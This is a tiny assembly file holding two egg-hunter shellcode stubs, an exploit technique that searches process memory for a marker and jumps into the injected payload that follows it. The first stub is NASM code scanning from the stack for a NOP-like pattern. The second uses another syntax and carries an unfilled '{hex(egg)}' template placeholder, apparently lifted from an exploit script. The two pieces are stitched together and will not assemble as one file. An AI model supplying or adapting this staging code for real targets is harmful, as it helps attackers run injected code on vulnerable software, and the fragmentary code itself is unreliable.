global _start

section .text
_start:
    lea rsi, [rsp]
    mov eax, 0x909090
findNOP:
    cmp dword [rsi], eax
    je  found
next:
    inc rsi
    jmp findNOP
found: 
    lea rsi, [rsi+4]
    jmp rsi
; --------------------------------------
.intel_syntax noprefix
    mov rbx,{hex(egg)}
    call g 
g:  pop rsi
repeat:  
    cmp qword ptr [rsi],rbx
    je f
    inc rsi
    jmp repeat
f:  
    jmp rsi